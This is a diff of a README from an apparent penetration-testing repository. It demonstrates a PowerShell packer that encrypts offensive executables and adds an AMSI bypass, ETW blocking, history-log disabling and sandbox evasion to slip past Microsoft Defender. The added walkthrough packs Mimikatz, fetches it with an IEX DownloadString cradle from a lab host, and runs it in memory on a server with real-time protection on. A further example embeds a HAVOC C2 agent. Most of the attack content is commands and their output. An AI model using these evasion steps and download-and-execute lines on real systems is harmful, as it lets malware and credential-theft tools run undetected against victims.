@@ -2,27 +2,143 @@
 AV bypass using my PowerShell packer 'Invoke-PoSH-PePacker'
 ================================================================================================================================================
 
-'Invoke-PoSH-PePacker' allows to pack and encrypt offensive PE files in order to bypass AV solutions such as Windows Defender.
-It generates an obfuscated and encrypted PowerShell script that embeds the PE file. 
+'Invoke-PoSH-PePacker' allows to pack and encrypt offensive PE files in order to bypass AV solutions such as Microsoft Defender AV.
+It generates an obfuscated and encrypted PowerShell script that contains the PE file that you want to pack.
 
-=> URL: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker/
+> URL: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-PePacker
 
-FEATURES
----------
-- AES encryption and GZip/Deflate compression (based on 'Xencrypt')
-- Reflective PE injection (based on an updated version of 'Invoke-ReflectivePEInjection')
-- AMSI bypass
-- Blocking Event Tracing for Windows (ETW)
-- Disabling PowerShell history logging
-- Basic sandbox evasion techniques (optional -sandbox)
-  + stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
-  + wait for 60 seconds before execution
-  
+> FEATURES
+  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+  - Reflective PE injection (based on an updated version of 'Invoke-ReflectivePEInjection')
+  - AMSI bypass (pseudo random)
+  - Blocking Event Tracing (ETW) for Windows (i.e. disable script-block logging within current PoSH process)
+  - Disabling PowerShell history logging
+  - Basic sandbox evasion techniques (optional)
+    + stop/exit if the PowerShell script is not run on a domain-joined Windows computer
+    + wait for 60 seconds before execution
 
-===================================================================================================================================================
-Example 1 - Create & then run a obfuscated/encrypted PowerShell script that contains a HAVOC C2 agent on a Windows 10 Laptop without getting 
-            detected by Windows Defender
-===================================================================================================================================================
+
+================================================================================================================================================
+Example 1 - Create and then run an obfuscated/encrypted PowerShell script that contains 'Mimikatz.exe' on a Windows server 2022 
+            without getting detected by Microsoft Defender AV
+================================================================================================================================================
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+Step 1 - Create a packed/encrypted version of the tool 'Mimikatz.exe' using 'Invoke-PoSH-PePacker.ps1'
+-------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Temp > IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Jean-Francois-C/Windows-Penetration-Testing/master/Defense%20evasion%20(examples)/
+             Invoke-PoSH-PePacker/Invoke-PoSH-PePacker.ps1');
+
+  ___ ___    ___        _
+ | _ \ __|__| _ \__  __| |_____ _ _
+ |  _/ _|___|  _/ _|/ _| / / -_)  _|
+ |_| |___|  |_| \__,\__|_\_\___|_|
+                                   v1.4
+
+Usage:
+> Import-Module ./Invoke-PoSH-PePacker.ps1
+> Invoke-PoSH-PePacker -FileUrl https://URL/PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
+> Invoke-PoSH-PePacker -FilePath C:\path\PE-file.exe -OutFile C:\path\Packed-PE-file.ps1
+
+Features:
+[*] AES encryption and GZip/Deflate compression (based on 'Xencrypt')
+[*] Reflective PE injection (based on an updated version of 'Invoke-ReflectivePEInjection')
+[*] AMSI bypass
+[*] Blocking Event Tracing for Windows (ETW)
+[*] Disabling PowerShell history logging
+[*] Basic sandbox evasion techniques (optional -sandbox)
+
+
+PS C:\Temp> Invoke-PoSH-PePacker -FileUrl http://192.168.1.144:8080/mimikatz.exe -Outfile C:\Temp\packed-mimi2025.ps1
+
+[*] Downloading the remote PE file: 'http://192.168.1.144:8080/mimikatz.exe'
+[*] Creating the reflective PE file injection script
+[*] File compression (GZip/Deflate)
+[*] File encryption (AES)
+[*] Adding 'A'M'S'I' bypass
+[*] Adding 'E'T'W' bypass
+[*] Disabling PoSh history logging
+[*] The obfuscated & encrypted PE file loader script has been saved: 'C:\Temp\packed-mimi2025.ps1' ...
+[+] Done!
+
+PS C:\Temp>
+
+-------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download & execute in-memory the PowerShell script (that embeds Mimikatz) on a Windows server 2022 without being detected by the 
+         Microsoft Defender Antivirus (AMSI bypass, Reflective PE injection, Disabling PowerShell history logging, ...)
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\Users\Administrator> systeminfo
+
+Host Name:                 SERVER-WIN2022
+OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
+OS Version:                10.0.20348 N/A Build 20348
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Server
+OS Build Type:             Multiprocessor Free
+Registered Owner:          Windows User
+Registered Organization:
+Product ID:                00454-40000-00001-AA898
+Original Install Date:     5/2/2025, 10:44:40 AM
+System Boot Time:          5/26/2025, 11:26:53 AM
+<SNIP>
+
+PS C:\Users\Administrator>  Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated|FL
+
+AntivirusEnabled              : True
+RealTimeProtectionEnabled     : True
+IoavProtectionEnabled         : True
+AntispywareEnabled            : True
+AntivirusSignatureLastUpdated : 5/26/2025 6:31:01 AM
+
+
+PS C:\Users\Administrator> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/packed-mimi2025.ps1');
+
+PS C:\Users\Administrator> Execute-PE Coffee
+
+VERBOSE: PowerShell ProcessID: 1188
+VERBOSE: Calling Invoke-MemoryLoadLibrary
+VERBOSE: Getting basic PE information from the file
+VERBOSE: Allocating memory for the PE and write its headers to memory
+VERBOSE: Getting detailed PE information from the headers loaded in memory
+VERBOSE: StartAddress: 0x000001E31A8B0000    EndAddress: 0x000001E31AA21000
+VERBOSE: Copy PE sections in to memory
+VERBOSE: Update memory addresses based on where the PE was actually loaded in memory
+VERBOSE: Import DLL's needed by the PE we are loading
+VERBOSE: Done importing DLL imports
+VERBOSE: Update memory protection flags
+VERBOSE: Call EXE Main function. Address: 0x000001E31A9744D0. Creating thread for the EXE to run in.
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 28 2024 17:42:39
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # Coffee
+
+    ( (
+     ) )
+  .______.
+  |      |]
+  \      /
+   `----'
+
+mimikatz #
+mimikatz # exit
+Bye!
+VERBOSE: EXE thread has completed.
+VERBOSE: Done!
+
+PS C:\Users\Administrator>
+
+
+================================================================================================================================================
+Example 2 - Create & then run an obfuscated/encrypted PowerShell script that contains a HAVOC C2 agent on a Windows 10 Laptop without getting 
+            detected by the Microsoft Defender Antivirus
+================================================================================================================================================
 
 ----------------------------------------------------------------------------------------------------------------------
 Step 1 - Generate a HAVOC C2 agent named 'Havocdemon.exe'
@@ -221,10 +337,10 @@ Hotfix(s):                 19 Hotfix(s) Installed.
 
 
 
-===================================================================================================================================================
-Example 2 - Create & then run a obfuscated/encrypted PowerShell script that contains 'Mimikatz.exe' on a Windows 10 Laptop without getting detected
-            by Windows Defender
-===================================================================================================================================================
+====================================================================================================================================================
+Example 3 - Create & then run an obfuscated/encrypted PowerShell script that contains 'Mimikatz.exe' on a Windows 10 Laptop without getting detected
+            by the Microsoft Defender Antivirus
+====================================================================================================================================================
 
 ---------------------------------------------------------------------------------------------------------------
 Step 1 - Create a packed/encrypted version of the tool 'Mimikatz.exe' using 'Invoke-PoSH-PePacker.ps1'
